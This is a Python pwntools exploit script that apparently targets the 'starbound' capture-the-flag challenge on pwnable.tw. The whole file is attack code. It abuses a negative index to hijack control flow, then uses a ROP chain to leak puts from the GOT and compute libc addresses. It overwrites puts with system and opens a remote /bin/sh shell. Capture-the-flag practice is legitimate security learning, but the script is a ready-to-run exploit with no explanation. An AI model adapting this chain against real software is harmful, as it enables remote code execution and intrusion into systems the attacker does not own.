#!/usr/bin/env python
from pwn import *

addr = "chall.pwnable.tw"
port = 10202
binary = "./starbound"

elf = ELF(binary)
bss = elf.bss()
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
write_plt = elf.plt['write']
write_got = elf.got['write']
read_plt = elf.plt['read']
read_got = elf.got['read']

puts_offset = 0x0005fca0
gadget = 0x804926d
pppr = 0x804a6dd
cmd = "/bin/sh\x00"

s = remote(addr, port)

sleep(0.3)
print s.recvuntil(">")
s.send("6")

sleep(0.3)
print s.recvuntil(">")
s.send("2")

sleep(0.3)
print s.recvuntil("Enter your name: ")
s.sendline(p32(gadget))

sleep(0.3)
print s.recvuntil(">")

payload = "-33"
payload += "A"*5

payload += p32(write_plt)
payload += p32(pppr)
payload += p32(1)
payload += p32(puts_got)
payload += p32(4)

payload += p32(read_plt)
payload += p32(pppr)
payload += p32(0)
payload += p32(puts_got)
payload += p32(4)

payload += p32(read_plt)
payload += p32(pppr)
payload += p32(0)
payload += p32(bss)
payload += p32(len(cmd))

payload += p32(puts_plt)
payload += "AAAA"
payload += p32(bss)

s.send(payload)

sleep(0.3)
s.recv(4096)

sleep(0.3)
puts_libc = u32(s.recv(4))

libc_base = puts_libc - puts_offset
system_libc = libc_base + 0x0003ada0

log.info("libc_base : %x" % libc_base)
log.info("puts_libc : %x" % puts_libc)
log.info("system_libc : %x" % system_libc)

s.send(p32(system_libc))
s.send(cmd)

s.interactive()
s.close()
